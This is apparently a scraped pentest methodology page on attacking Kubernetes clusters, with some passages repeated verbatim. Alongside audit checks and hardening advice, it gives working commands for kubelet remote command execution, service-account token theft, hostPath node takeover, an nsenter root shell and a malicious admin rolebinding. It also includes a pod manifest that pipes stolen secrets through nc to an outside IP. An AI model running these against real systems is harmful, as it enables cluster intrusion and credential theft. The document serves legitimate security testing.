its version, and read access to the DB Proxy Discovery Checks for the existence of a an open Proxy service Host Discovery when running as pod Generates ip adresses to scan, based on cluster/scan type Pod Capabilities Hunter Checks for default enabled capabilities in a pod Dashboard Hunting Hunts open Dashboards, gets the type of nodes in the cluster Api Version Hunter Tries to obtain the Api Server's version directly from /version endpoint Kubectl CVE Hunter Checks if the kubectl client is vulnerable to known CVEs Etcd service check for the existence of etcd service Access Secrets Accessing the secrets accessible to the pod Kubectl Client Discovery Checks for the existence of a local kubectl client Proxy Hunting Hunts for a dashboard behind the proxy API Server Hunter Accessing the API server using the service account token obtained from a compromised pod Active Hunters: Kubelet Container Logs Hunter Retrieves logs from a random container Prove /var/log Mount Hunter Tries to read /etc/shadow on the host by running commands inside a pod with host mount to /var/log Kubelet Run Hunter Executes uname inside of a random container K8s Version Hunter Hunts Proxy when exposed, extracts the version Build Date Hunter Hunts when proxy is exposed, extracts the build date of kubernetes Azure SPN Hunter Gets the azure subscription file on the host by executing inside a container API server hunter Accessing the api server might grant an attacker full control over the cluster Arp Spoof Hunter Checks for the possibility of running an ARP spoof attack from within a pod (results are based on the running node) Etcd Remote Access Checks for remote write access to etcd- will attempt to add a new key to the etcd DB Kubelet System Logs Hunter Retrieves commands from host's system audit DNS Spoof Hunter Checks for the possibility for a malicous pod to compromise DNS requests of the cluster (results are based on the running node) External Pentest # In an external pentest the scenario is that you do not have access to the kubernetes cluster at all. There is not that much kubernetes-specific attacks that can be performed. Mainly scan for open ports that might be related to kubernetes. Check open ports # nmap <ip> -p 443/tcp - Kubernetes API server 2379/tcp - Etcd 2380/tcp - Etcd 6666/tcp - Etcd 4194/tcp - cAdvisor - Container Metrics 6443/tcp - Kubernetes API server 8443/tcp - Minikube API server 8080/tcp - Kubernetes API server 10250/tcp - Kubelet - HTTPS API with full node access 10255/tcp - Kubelet - Unauthenticated readonly.

The Kubernetes API server by default prohibits \"Anonymous\" users to interact with it. If a request is made without any bearer-token the user is given the username system:anonymous and the group system:unauthenticated . However, you never know it might be misconfigured and allow anonymous. [ ] Check if kubelet port 10255 is exposed - for information disclosure Kubelet is running on all worker nodes. It is running on port 10255, and no authentication is required. It is only possible to read from the API. It is meant to be exposed unauthenticated from inside the cluster. But not externally. Check to see if the port is accessible on all workers nodes external addresses: curl http://<external worker node ip>:10255/pods Internal Pentest # Useful recon commands # kubectl get nodes -o wide -A Get external IP of master node kubectl config view Get internal IP of master node kubectl get svc -o wide # The clusterIP is the internal IP to your master node Check the environment variables in the Pod: env #KUBERNETES_PORT_443_TCP_PROTO=tcp #KUBERNETES_PORT_443_TCP_ADDR=10.39.240.1 #KUBERNETES_SERVICE_HOST=10.39.240.1 #KUBERNETES_PORT=tcp://10.39.240.1:443 #KUBERNETES_PORT_443_TCP_PORT=443 # This will resolve to a Service IP which in turn will be routed to the API server. host kubernetes.default.svc Get IP:s of worker nodes If you have access to kubectl . kubectl get nodes -o wide If you have kubectl and want to run it with a service-token: kubectl --insecure-skip-tls-verify=true --server=\"https://<internal or external kube-apiserver ip>:443\" --token=\"eyJ[...]\" get pods If you are in a pod with kube-hunter you can run: python kube-hunter --interface --mapping What is basically does is that it performs a port-scan of the entire range of the pods internal IP-address. It looks for ports like 8001, 8080, 10250, 10255, 30000, 443, 6443, 2379 Check what node a pod is running on kubectl get pod <name-of-pod> -o yaml Port scan the cluster Check your ip and subnet in the pod: ip a Scan the cidr for interesting ports, you will find other Pods and other nodes. nmap 10.36.0.1/24 -p 8001,8080,10250,10255,30000,443,6443,2379 Basic tests # [ ] Check for anonymous access to kube-apiserver See \"Useful recon commands\" how to get the external or internal IP of the kube-apiserver. The entire kube-apiserver API documentation is found here: https://docs.openshift.com/container-platform/3.3/rest_api/kubernetes_v1.html By default interesting API endpoints are restricted by default, but you never know until you try. curl -k https://<external or internal ip to kube-apiserver>:443/api/v1/componentstatus curl -k https://<external or internal ip to kube-apiserver>:443/api/v1/namespaces/default/secrets You should get a response with Forbidden if it doesn't work. [ ] Check for anonymous access to ETCD Etcd by default does not allow anonymous access to its database, but you never know. kube-hunter checks for the existence of an etcd service on the subnet. It also checks if the user has read access to it. curl http://<internal or external ip>:2379/version curl http://<internal or external ip>:2379/v2/members curl http://<internal or external ip>>:2379/v2/keys/?recursive=true # Or using the etcdctl tool etcdctl -endpoints=http://<MASTER-IP>:2379 get / -prefix -keys-only In GKE port 2379 is only available to the Master API through the loop-back interface. So the port is not exposed externally or on the internal network. [ ] Check if kubelet port 10250 is accessible unauthenticated. Kubelet is a service that is running on the worker nodes. It is just a REST API running on port 10250 and 10255. The idea of the Kubelet API is to receive instructions from the kube-apiserver service on the master node. Since it is not meant for human users its API is actually not documented. But by reading the source we know a little bit about it. For example, the following endpoints: curl -k https://workernode:10250/pods curl -k https://k8-node:10250/runningpods/ Lists running pods curl -k https://workernode:10250/exec Executes a command in a container, and returns a link to view the output. If you get \"Unauthorized\" well, then anonymous users are not authorized to access the API. If you get a response to the /pods request, it might mean that it allows anonymous authentication. Which means that you might be able to RCE the pods. By using the exec endpoint you can execute commands on other pods. curl -k -XPOST \"https://k8-node:10250/run/kube-system/kube-dns-5b1234c4d5-4321/dnsmasq\" -d \"cmd=ls -la /\" # You can also check the environment variable to see if you can get the kubelet token: curl -k -XPOST \"https://k8-node:10250/run/kube-system/kube-dns-5b1234c4d5-4321/dnsmasq\" -d \"cmd=env\" For reference on how to exploit this see: http://carnal0wnage.attackresearch.com/2019/01/kubernetes-unauth-kublet-api-10250_16.html [ ] Check kubelet port 10255 (read only) for information disclosure Kubelet is running on port 10255, but is read-only. It is nothing to report if it is only available on the inside of the cluster, but it should not be exposed externally. It can still be useful to an attacker inside the cluster, as a way to gather information. curl -k http://10.36.2.1:10255/pods [ ] Check for Service account secret / token If no service account is specified for a Pod, the Pod is automatically assigned the default service account in the namespace. Each pod is provided with a service account by default. The extent of the priviliges that is given to that account is configurable. So it is best to just verify it by testing it. The secret token is created and put in a volume that is automatically mounted to pods with the default service account. You can access the service account token (A JWT) in the Pod at the following path: /var/run/secrets/kubernetes.io/serviceaccount/token You can take the JWT and try to authenticate to the kube-apiserver like this: Note that the port can be 443 or 6443. So try both. curl -k -H \"Authorization: Bearer eyJhbG[...] \" https://<masternode ip>:443/api/v1/namespaces/default/secrets Another way to do it is with kubectl like this: kubectl --insecure-skip-tls-verify=true --server=\"https://<masternode-ip>:443\" --token=\"eyJh[...]\" get secrets --all-namespaces -o json kube-kunter also performs this check when running with the --pod flag, like this python kube-hunter.py --pod Reference to hack: https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0 Recommendation You can configure an admission controller to not automatically mount the token. [ ] Check for CVE-2018\u20131002105 The vulnerability allows users permitted to one namespace to interact with the Master API in other namespaces. It is easy to test for, the issue is fixed in the following versions, and above: v1.10.11 v1.11.5 v1.12.3 kubectl version For how to exploit it see: https://blog.appsecco.com/analysing-and-exploiting-kubernetes-apiserver-vulnerability-cve-2018-1002105-3150d97b24bb https://gravitational.com/blog/kubernetes-websocket-upgrade-security-vulnerability/ [ ] Check for usage of Helm There is a kubernetes package manager called Helm. Helm consists of a Client, which is the Helm Client. ANd a server, called Tiller server. The Helm repository is just a simple webserver from which you can search and find packages. Tiller is a server running the cluster. [ ] HostPath - Mount worker node root directory to Pod If you have an account that can deploy pods, you can mount the node workers root directory into the pod. And thereafter access the node workers root directory, and for example change the password of a user, which you can then use to ssh into the node. This attack can be performed in the following way: Create a new pod, like the following, and aplly it: kubectl apply -f testdeployment.yaml apiVersion: apps/v1 kind: Deployment metadata: name: testpod-deployment labels: app: testpod spec: replicas: 1 selector: matchLabels: app: testpod template: metadata: labels: app: testpod spec: containers: - name: testpod image: gcr.io/kuberntest/kubeaudit:latest volumeMounts: - mountPath: /root name: rooten volumes: - name: rooten hostPath: path: / Now you can just use chroot and change the password of a user, and then ssh into the node worker with that user. cd /root chroot /root /bin/bash passwd <someuser> In order to perform this attack against all the node-workers it is posssible to deploy a DaemonSet. A DaemonSet is a workload that ensures that a Pod is run on all worker nodes. If new worker nodes are added to the cluster the DaemonSet will ensure that each has the specified pod running on it. It can be sueful if you want to run a logs collection daemon on all nodes, or a monitoring daemon. Those pods usually mount the nodes log directory to the pod. This can be used to ensure that out malicious pod available on all worker nodes. Recommendation You can create a PodSecurityPolicy that disallows pods from mounting the root directory from the Host. You can also create a network policy that disallows outgoing traffic, thus preventing reverse shells a bit. [ ] Check if running Kubelet on master node If you are running kubelet on a master node, and the user is able to mount a directory from the host into the pod, then you will be able to gain access to the etcd certificates. With these certificates it is possible to comunicate directory to etcd, and thereby retreive secrets/tokens of high priviliged users. Note that in your manifest file you can specify which node you want to deploy your POD on. By doing that you can specify that you want to deploy your pod on the master node (if that node is running kubelet). This means that the scheduler, is not a security boundry, you can simply just bypass the scheduler. The attack is explained here, around minute 16: https://www.youtube.com/watch?v=HmoVSmTIOxM Recommendation Don't run kubelet on the control plane (On the master-node) Don't allow mounting of HostPath Sheduler is not a security component - exact node can be specified in the POD manifest [ ] Check for Docker-in-Docker Some people want to run docker in a Pod. In order to do that they usually mount the worker-node docker-socket into the Pod. This is usually done using hostPath in the pod/deployment manifest file. The docker api is unauthenticated, so anyone with access to the socker can interact with it. To check for it grab all the deployment and pod manifest-files, and search for: hostPath: path: /var/run/docker.sock Note that this attack works evern though privilige-escalation is denied, and the Pod is running as a non-root user. So, if the docker-socket is mounted, a user within the Pod can run a docker-container on the underlying host, the worker node, for example. If you can do that, you can mount a worker node directory, such as /etc, to your docker container, and from there gain access to the underlying filesystem. Recommendation Don't mount the docker-socket to a Pod. Restrict usage of hostPath with an admission controller. [ ] Check for HostPid allow So just like you are able to escalate priviliges by mounting in the host root directory, it is also possible to escalate priviliges if you are allowed to create a Pod with the hostPid . See how to attack this here: https://www.youtube.com/watch?v=HmoVSmTIOxM If the Pod is deployed with these settings: securityContext: priviliged: true hostPID: true It means that you can run the following command in the Pod to get a root shell on the underlying host: sudo nsenter -a -t 1 bash Recommendation Use the adminission controller Pod Security Policy and disallow hostPid. Restrict the use of \"priviliged\" containers [ ] Check which services are exposed When an application is deployed, through a Pod or Deployment, it will not automatically become available to users outside the kubernetes cluster. In order to direct traffic to those services a kubernetes service is needed. We need to check what services are exposed externally, to see if any sensitive servicea accidentally has been expoesed. If those services are vulnerable or not can be considered out of scope (we are not testing the applications hosted on the cluster). But some kubernetes specific services might be exposed, and that might constitute a finding. kubectl get services -A -o wide [ ] Check which versions kubernetes components are running A kubernetes cluster consist of many components, and those components vary from cluster to cluster. Some of these components are vulnerable, for example older Traefik versions are vulnerable to RCE. You can check which versions the components have by checking which image they use, this can be Check which image versions of deployments: kubectl describe deployments -A Authorization # There are some quirks regarding the authorization system that might be interesting. For example, a user (maybe even a service account) might have the right to execute commands on pods, but it might not have the right to deploy new pods. If that is the case then it is possible to simply execute a command on other pods and extract the auto-mounted credentials, and then use those credentials to, for example, deploy a new pod. In this way it is possible to escalate in priviliges within a cluster. The most basic components of RBAC (Roles Based Access Control) are the following: ClusterRoles A ClusterRole applies to the whole cluster. Roles A normal Role only applies to a specific namespace. ClusterRoleBindings RoleBindings RBAC grant access to resources with specifc verbs, like get , describe . A resource is basically information that can be access. Secrets, pod information etc. The verbs specify how the resource can be access, get,list,watch etc. RoleBindings and ClusterRoleBinding is of course the way we bind a specific role to a specific user. One tool that I have found that can be of interest is this: https://raw.githubusercontent.com/cyberark/kubernetes-rbac-audit/master/ExtensiveRoleCheck.py https://github.com/cyberark/kubernetes-rbac-audit kubectl get roles --all-namespaces -o json > Roles.json kubectl get clusterroles -o json > clusterroles.json kubectl get rolebindings --all-namespaces -o json > rolebindings.json kubectl get clusterrolebindings -o json > clusterrolebindings.json python ExtensiveRoleCheck.py --clusterRole clusterroles.json --role Roles.json --rolebindings rolebindings.json --cluseterolebindings clusterrolebindings.json To list service accounts: kubectl get serviceaccounts -A [ ] Check for interesting user and service account rights One kind of complicated way to test what a specific user can do is to run the following # Check if your current user can run `exec` on pods. kubectl auth can-i exec pods kubectl auth can-i get pods Take low priviliged account that you have been given or compromised, and use that account when you run: kubectl auth can-i --list kubectl auth can-i --list -n SomeNameSpace So what to look for? Look for the verb list together with secrets . That might mean that you can list other users secrets, and steal their JWT token. Resource Verb Comment secrets list or * secrets get * get Can be used to get secrets. asdasdlasdhaklw Can be used to get secrets. [ ] Check for CVE: CVE-2018-18264 Privilige Escalation kubectl proxy 8001 In your browser go to http://localhost:8001 If you can access it, klick on \"skip\" for the authentication. The go to URL: /api/v1/namespaces/kube-system/secrets/kubernetes-dashboard-certs and see if you can get some secrets. The simple way to check this is to see if the kubernetes version is below: 1.10.1 kubectl version https://sysdig.com/blog/privilege-escalation-kubernetes-dashboard/ [ ] Create Pod in kube-system namespace and automount service account So if you have a kubernetes user that can deploy pods in any namespace you can mount in a high priviliged service account into the the pod, and then extrct those credentials. This can be done in the following way. Deploy the following pod: apiVersion: v1 kind: Pod metadata: name: alpinetest namespace: kube-system spec: containers: - name: alpine image: alpine command: [\"/bin/sh\"] args: [\"-c\", 'apk update && apk add curl --no-cache; sleep 100000'] serviceAccountName: bootstrap-signer automountServiceAccountToken: true hostNetwork: true This technique can be used if your user does not have the permission to list secrets, but is allowed to deploy pods in any namespace. Also, you do not have to have the exec permission to use the attack. You can deploy the pod to automatically send the credentials, like this: apiVersion: v1 kind: Pod metadata: name: alpine namespace: kube-system spec: containers: - name: alpine image: alpine command: [\"/bin/sh\"] args: [\"-c\", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000'] serviceAccountName: bootstrap-signer automountServiceAccountToken: true hostNetwork: true [ ] Deploy pods using Create/update deployment, Daemonsets, statefulsets,Replicationcontrollers, Replicasets, Jobs, Cronjobs There are many ways to deploy pods. Even if your user is not allowed to create a pod it might be possible to create pods using other types of workloads. All these ways can be used to deploy pods and possibily escalate priviliges using the technique explained in the issue above. Workloads that can be used to create pods are the following: Create/update deployments Daemonsets Statefulsets Replicationscontrollers Replicasets Jobs Cronjobs Readthe documentation for each for in order to see how to do it. As in the attack above you will need to be able to deploy in the namespace kube-system . https://www.cyberark.com/threat-research-blog/kubernetes-pentest-methodology-part-1/ [ ] Privilige to use Pods/Exec This is pretty simple. But if your user has the permission to perform pods/exec with any namespace you can simply enter into any pod, and extract the default service accounts. kubectl exec -it <POD NAME> -n <POD\u2019S NAMESPACE> -- sh [ ] Privilege to Get/patch rolebindings The idea here is if your user has the permission to edit rolebindings that use can simply bind a user to the ClusteAdmin role and thereby escalate priviliges to the highest. Check your priviliges with your low priviliges user with the following command: kubectl auth can-i --list If you have the permission to create Rolebindings you can create a malicious rolebinding like this: You might have to change the namespace and the service account to your service account and namespace. { \"apiVersion\": \"rbac.authorization.k8s.io/v1\", \"kind\": \"RoleBinding\", \"metadata\": { \"name\": \"malicious-rolebinding\", \"namespace\": \"default\" }, \"roleRef\": { \"apiGroup\": \"*\", \"kind\": \"ClusterRole\", \"name\": \"admin\" }, \"subjects\": [ { \"kind\": \"ServiceAccount\", \"name\": \"default\", \"namespace\": \"default\" } ] } If it works you can use the token of the service account to do anything to want in the cluster. [ ] Check for impersonation privileges There exists a functionality to impersonate service accounts. This can be used if you want to check that a a serviceaccount has apropriate priviliges, but it can also be used for malicious intents. curl -k -v -XGET -H \u201cAuthorization: Bearer <JWT TOKEN (of the impersonator)>\u201d -H \u201cImpersonate-Group: system:masters\u201d -H \u201cImpersonate-User: null\u201d -H \u201cAccept: application/json\u201d https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/ [ ] Check if RBAC is used Role-Based Access Control has been the stable since version 1.8 RBAC is enabled by the apiserver by starting the apiserver with this flag --authorization-mode=RBAC If you don't ahve access to the apiserver flags you can check it interactivly by running: kubectl api-versions If you see the following output RBAC is enabled: rbac.authorization.k8s.io/v1 rbac.authorization.k8s.io/v1beta1 If Kubernetes is run as a managed cluster with Azure you can check if with the following: az aks list Check for: RBAC true However, it is still possible to disable. Do check that it is enabled. Security Audit # The security audit is a profile used when the tester has a kubernetes user with read privileges and is able to talk to the apiserver. [ ] Check if PodSecurityPolicy is supported It might be that kubernets is started without enabling PSP. kubectl get psp If PSPS is not supported, or enabled you will get the following error: the server doesn't have a resource type \"podSecurityPolicies\". If it is supported you get either the policies or an error such as: No resources found Recommendation Enable PSP. This is done differently according to the vendor. In Minikube it can be done the following way: minikube start --extra-config=apiserver.GenericServerRunOptions.AdmissionControl=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,DefaultStorageClass,ResourceQuota,DefaultTolerationSeconds,PodSecurityPolicy [ ] Check if PodSecurityPolicy is used Remember to add the -A flag, so that you can view the podsecurity policies in all namespaces. kubectl get psp -A kubectl describe psp Inspect the PSPs. Now you need to figure out which PSPs are actually used. PSPs are applied to Pods using annotations. If you are clusteradmin, and can check all pods in all namespaces, you can run the following command: kubectl describe pods -A Now check the annotations part to see which PSP is applied to each Pod. The annotation part usually look something like this: Annotations: kubernetes.io/psp: <name of PSP> [ ] Static analysis of yaml files - Searching for secrets Secrets should not be stored in the yaml configuration for workloads such as pods, deployments, jobs etc. Maybe a secret is stored in an environment variable in the a yaml, and that yaml is accessible to everyone. kubectl describe pods -A kubectl describe deployments -A There are a lot of other bad configurations that can be introduced. One way to check these is with the tool kubesec. I have not used this tool, and not audited it. So run it on your own responsibility. https://kubesec.io/ I think you can just output the yaml file and then run it in kubesec. kubectl describe deployments -A > describe-deployments.txt cat -n describe-deployments.txt | sed -n '/Environment/,/Mount/p' kubectl get pod kubeaudit-6f5964556b-5vnk5 -o yaml [ ] Check that pods are running as non-root users By having the services on the containers running as a non-root user it makes it more difficult for an attacker to escape the the container to the host os. The container is sandboxed from other containers running on the host with the help of linux namespaces. It is more probable that a container breakout is possible if the pod is running as root. Another reason to not run a service as root is that if kubernetes has been misconfigured to accidentally expose volumes to the container, the volume will still not be able to mount because of lacking root priviliges. This can be verified the following way, albeit not perfectly. This way will only show if the service in the container is running as root or some other user. It might be that it is possible to run sudo su and escalate priviliges. kubectl -n thenamespace exec mypod whoami and kubectl -n thenamespace exec -it mypod /bin/bash Therefore it is better to configure a PodSecurityPolicy to handle the problem. It is possible to create a PodSecurityPolicy that disallows containers to run as root. If such a policy exists the apiserver will disallow the deployment of a container that is running as root. The following lines in a PodSecurityPolicy disallows containers from running as root. # Required to prevent escalations to root. allowPrivilegeEscalation: false runAsUser: # Require the container to run without root privileges. rule: 'MustRunAsNonRoot' One issue that might occur here is that the app cant use ports below 1024. This can be solved by running the app on a higher port, by expose it on a lower. An example of this could be the following: kind: Service apiVersion: v1 metadata: name: my-service spec: selector: app: MyApp ports: - protocol: TCP port: 443 targetPort: 8443 https://kubernetes.io/blog/2018/07/18/11-ways-not-to-get-hacked/ [ ] Check the usage of network policies NetworkPolicy is just a kubernetes-word for firewall. By default all pods in the kubernetes cluster is allowed to talk to all pods. There is not segmentation between pods. This can be restricted with network policies. kubectl get networkpolicies -A This is an example of a network policy: apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: myapp-deny-external-egress spec: podSelector: matchLabels: app: myapp policyTypes: - Egress egress: - ports: - port: 53 protocol: UDP - to: - namespaceSelector: {} Resources # https://dev.to/petermbenjamin/kubernetes-security-best-practices-hlk","title":"Attacking Kubernetes"},{"location":"attacking_kubernetes/attacking_kubernetes/#introduction","text":"","title":"Introduction"},{"location":"attacking_kubernetes/attacking_kubernetes/#managed-vs-unmanaged","text":"A good thing to ask the customer is if they are running a managed or unmanaged cluster. That is, is the cluster managed by gcloud (GKE), AWS (EKS), or Microsoft (AKS), or some other cloud-provider? If it is, it's a bit less likely that some of the configuration mistakes are made. It also means that the administrators of the cluster might have less ability to manage the cluster themselves. How much of the cluster that is managed depends on the cloud provider. They might be responsible for updating kubernetes, and configure the Master node, and only let the customer control the worker nodes. In GKE for example, the Control Plane is managed by Gcloud, and the worker nodes are managed by the customer. The Control Plane (Cluster Master/ Master Node) is essentially a black box to the administrator. Another managed kubernetes provider is Rancher. A drawback of using a managed cluster is that you might not have access to all features that is available in a unmanaged cluster. If you run an unmanaged cluster you will have access to the master node, and you will be repsonsible for updating kubernetes.","title":"Managed vs unmanaged"},{"location":"attacking_kubernetes/attacking_kubernetes/#some-terminology","text":"Kubernetes API This API is accessible on port 6443 or 443 (GCE, and other Cloud providers usually run it on port 443, while the default is on 6443) on the master node. It is the API that kubectl uses, and through it you managed the desired state of your cluster. If you have high priviliges to the API you own the cluster. It is with this API that you defined things such as: what pods to run, how many replicas, what network and disk resources you want to make available. The API is the single source of truth. The API is sometimes referred to as kube-apiserver because that is the name of the server running on the Cluster master. Kubernetes Control Plane The Control Plane is in charge of putting your cluster in the state that you configured through the Kubernetes API. The term Control Plane is kind of an umberella term to combine several processes running on the master and worker nodes. The Kubernetes Master is a set of three processes that are running on your Master Node. Those processes are: kube-apiserver , kube-controller-manager , and kube-scheduler . Each non-master node runs the following processes: kubelet and kube-proxy . The kubelet process communicates with the Kubernetes Master. The kube-proxy is a network proxy which reflects Kubernetes networking services on each node. Master node aka Cluster master The master node usually runs these services/processes: kube-apiserver - API Server - Available on port 443 - It communicates with kubelet , available on the worker nodes. The communication is bi-directional. ETCD - Scheduler - In a managed cluster, like GKE, google is responsible to upgrade the Master. But you can also manually upgrade it using gcloud CLI tool. Worker node A cluster typically has at least one or more nodes. When people say nodes they usually refer to these worker nodes. It is sometimes called: cluster node, worker node. A worker node is hardware (or virtualized hardware). You need a dedicated VM to function as your worker node. In GKE the worker nodes are just VM-instances. The worker node usually runs these services/processes: Kubelet - The communication between the kubelet and the kube-apiserver is bi-directional. The communication goes over REST HTTP. cAdvisor - Kube-proxy Pod - The pods are running on the worker node. But it is the kube-apiserver that holds the information about pods, like how many replicas it should have, etc. In managed cluster. Like GKE, you never ssh straight to the worker node. Instead the worker node is administrated through gcloud CLI tool or through the web console. The worker node usually have a few different interfaces. One interface on the kubernetes network, where the pods are. A one interface connected to the gcloud network. Workloads You often hear the concept Workloads mentioned. Kubernetes divides workloads into a few different types.1. Deployments 2. StatefulSets 3. DaemonSets 4. Jobs 5. Cronjobs Namespace Namespaces are a way to divide cluster resources in different groups, or namespaces. This can be useful when you want a user to only be able to access certain resources. Those resources can be put in a specific namespace that only that user has access to. A common usecase would be to create a development and a production namespace. Users interacting with one namespace do not see the content in another namespace. Admission controller You here this term quite a bit. An admission controller intercept objects between the user and the apiserver, kind of. An easy way to understand admission controller is to take the admission controller PodSecurityPolicy as an example. A pods properties is usually defined in a yaml file. And it is then deployed using this command: kubectl apply -f podfile.yaml The specification from the file is sent to the apiserver which then performs its magic and deploys the pod. If you have defined a PodSecurityPolicy the pod you are about to deploy is checked against the PodSecurityPolicy to make sure that the pod adheres to that policy, if it does not the deployment is stopped, and if it adheres to the policy the pod is deployed. There are two types of admission controllers: validating and mutating. Validating just valides the object, and mutating mutates it. There are many other admission controllers: https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/","title":"Some terminology"},{"location":"attacking_kubernetes/attacking_kubernetes/#useful-kubectl-commands","text":"The most important: kubectl api-resources The greatest kubectl flag you will ever see: -v=9 .

Its job is to store data related to the cluster. Things such as configuration data, state, and metadata. Etcd is distributed, which means that it usually runs on every cluster node. RBAC RBAC stands for Role-Based Access Control. It is the authorization model used in Kubernetes. It replaced Attribute Based Access Control (ABAC) since version 1.6. RBAC allows the cluster administrator perform granular access control. Specifying what each user and servoce account can do. A user can have a specific role. It is possible to specify which Object a Role should have access to, and which actions (called verbs) theys hould be able to perform. If the cluster is a managed cluster, like GKE, it is possible, and common, to integreate the cloud IAM with kubernetes RBAC. RBAC lets us define what subjects can take what actions on what types of objects, in what namespaces. RBAC is configured by configuring User (Service user or human-user), Roles and RoleBinding. So we can create a user, then a role, and the we will bind the user to that role. This can be done with just one configuration file, for example like this: kubectl create -f user.yaml --- apiVersion: v1 kind: ServiceAccount metadata: name: mynamespace-user namespace: mynamespace --- kind: Role apiVersion: rbac.authorization.k8s.io/v1beta1 metadata: name: mynamespace-user-full-access namespace: mynamespace rules: - apiGroups: [\"\", \"extensions\", \"apps\"] resources: [\"*\"] verbs: [\"*\"] - apiGroups: [\"batch\"] resources: - jobs - cronjobs verbs: [\"*\"] --- kind: RoleBinding apiVersion: rbac.authorization.k8s.io/v1beta1 metadata: name: mynamespace-user-view namespace: mynamespace subjects: - kind: ServiceAccount name: mynamespace-user namespace: mynamespace roleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: mynamespace-user-full-access","title":"Components"},{"location":"attacking_kubernetes/attacking_kubernetes/#tools","text":"There are a number of tools that can facilitate the pentest or audit of a kubernetes network. kube-hunter Url: https://github.com/aquasecurity/kube-hunter The tool can audit from the external perspective or internal.

It is just a REST API running on port 10250 and 10255. The idea of the Kubelet API is to receive instructions from the kube-apiserver service on the master node. Since it is not meant for human users its API is actually not documented. But by reading the source we know a little bit about it. For example, the following endpoints: curl -k https://workernode:10250/pods curl -k https://k8-node:10250/runningpods/ Lists running pods curl -k https://workernode:10250/exec Executes a command in a container, and returns a link to view the output. If you get \"Unauthorized\" well, then anonymous users are not authorized to access the API. If you get a response to the /pods request, it might mean that it allows anonymous authentication. Which means that you might be able to RCE the pods. By using the exec endpoint you can execute commands on other pods. curl -k -XPOST \"https://k8-node:10250/run/kube-system/kube-dns-5b1234c4d5-4321/dnsmasq\" -d \"cmd=ls -la /\" # You can also check the environment variable to see if you can get the kubelet token: curl -k -XPOST \"https://k8-node:10250/run/kube-system/kube-dns-5b1234c4d5-4321/dnsmasq\" -d \"cmd=env\" For reference on how to exploit this see: http://carnal0wnage.attackresearch.com/2019/01/kubernetes-unauth-kublet-api-10250_16.html [ ] Check kubelet port 10255 (read only) for information disclosure Kubelet is running on port 10255, but is read-only.

It can still be useful to an attacker inside the cluster, as a way to gather information. curl -k http://10.36.2.1:10255/pods [ ] Check for Service account secret / token If no service account is specified for a Pod, the Pod is automatically assigned the default service account in the namespace. Each pod is provided with a service account by default. The extent of the priviliges that is given to that account is configurable. So it is best to just verify it by testing it. The secret token is created and put in a volume that is automatically mounted to pods with the default service account. You can access the service account token (A JWT) in the Pod at the following path: /var/run/secrets/kubernetes.io/serviceaccount/token You can take the JWT and try to authenticate to the kube-apiserver like this: Note that the port can be 443 or 6443.

[ ] Check for CVE-2018\u20131002105 The vulnerability allows users permitted to one namespace to interact with the Master API in other namespaces. It is easy to test for, the issue is fixed in the following versions, and above: v1.10.11 v1.11.5 v1.12.3 kubectl version For how to exploit it see: https://blog.appsecco.com/analysing-and-exploiting-kubernetes-apiserver-vulnerability-cve-2018-1002105-3150d97b24bb https://gravitational.com/blog/kubernetes-websocket-upgrade-security-vulnerability/ [ ] Check for usage of Helm There is a kubernetes package manager called Helm. Helm consists of a Client, which is the Helm Client. ANd a server, called Tiller server. The Helm repository is just a simple webserver from which you can search and find packages. Tiller is a server running the cluster. [ ] HostPath - Mount worker node root directory to Pod If you have an account that can deploy pods, you can mount the node workers root directory into the pod. And thereafter access the node workers root directory, and for example change the password of a user, which you can then use to ssh into the node. This attack can be performed in the following way: Create a new pod, like the following, and aplly it: kubectl apply -f testdeployment.yaml apiVersion: apps/v1 kind: Deployment metadata: name: testpod-deployment labels: app: testpod spec: replicas: 1 selector: matchLabels: app: testpod template: metadata: labels: app: testpod spec: containers: - name: testpod image: gcr.io/kuberntest/kubeaudit:latest volumeMounts: - mountPath: /root name: rooten volumes: - name: rooten hostPath: path: / Now you can just use chroot and change the password of a user, and then ssh into the node worker with that user. cd /root chroot /root /bin/bash passwd <someuser> In order to perform this attack against all the node-workers it is posssible to deploy a DaemonSet. A DaemonSet is a workload that ensures that a Pod is run on all worker nodes. If new worker nodes are added to the cluster the DaemonSet will ensure that each has the specified pod running on it. It can be sueful if you want to run a logs collection daemon on all nodes, or a monitoring daemon. Those pods usually mount the nodes log directory to the pod. This can be used to ensure that out malicious pod available on all worker nodes. Recommendation You can create a PodSecurityPolicy that disallows pods from mounting the root directory from the Host. You can also create a network policy that disallows outgoing traffic, thus preventing reverse shells a bit. [ ] Check if running Kubelet on master node If you are running kubelet on a master node, and the user is able to mount a directory from the host into the pod, then you will be able to gain access to the etcd certificates. With these certificates it is possible to comunicate directory to etcd, and thereby retreive secrets/tokens of high priviliged users. Note that in your manifest file you can specify which node you want to deploy your POD on. By doing that you can specify that you want to deploy your pod on the master node (if that node is running kubelet). This means that the scheduler, is not a security boundry, you can simply just bypass the scheduler. The attack is explained here, around minute 16: https://www.youtube.com/watch?v=HmoVSmTIOxM Recommendation Don't run kubelet on the control plane (On the master-node) Don't allow mounting of HostPath Sheduler is not a security component - exact node can be specified in the POD manifest [ ] Check for Docker-in-Docker Some people want to run docker in a Pod. In order to do that they usually mount the worker-node docker-socket into the Pod. This is usually done using hostPath in the pod/deployment manifest file. The docker api is unauthenticated, so anyone with access to the socker can interact with it. To check for it grab all the deployment and pod manifest-files, and search for: hostPath: path: /var/run/docker.sock Note that this attack works evern though privilige-escalation is denied, and the Pod is running as a non-root user. So, if the docker-socket is mounted, a user within the Pod can run a docker-container on the underlying host, the worker node, for example. If you can do that, you can mount a worker node directory, such as /etc, to your docker container, and from there gain access to the underlying filesystem. Recommendation Don't mount the docker-socket to a Pod. Restrict usage of hostPath with an admission controller. [ ] Check for HostPid allow So just like you are able to escalate priviliges by mounting in the host root directory, it is also possible to escalate priviliges if you are allowed to create a Pod with the hostPid . See how to attack this here: https://www.youtube.com/watch?v=HmoVSmTIOxM If the Pod is 